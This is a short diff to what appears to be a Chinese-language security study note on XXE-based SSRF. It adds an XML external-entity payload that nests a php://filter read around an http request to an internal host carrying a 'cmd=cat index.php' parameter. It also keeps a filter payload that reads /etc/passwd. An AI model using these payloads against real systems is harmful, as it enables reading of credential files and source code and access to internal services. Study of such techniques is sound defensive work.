@@ -31,3 +31,12 @@ Date: 2026-01-05
 ```php
 php://filter/read=convert.base64-encode/resource=/etc/passwd
 ```
+
+嵌套http协议
+```XML
+<!DOCTYPE root [<!ENTITY guc SYSTEM "php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat%20index.php">]>
+```
+
+![](assets/XXE进行SSRF/file-20260105210144530.png)
+
+通过base64即可读取被执行的php文件
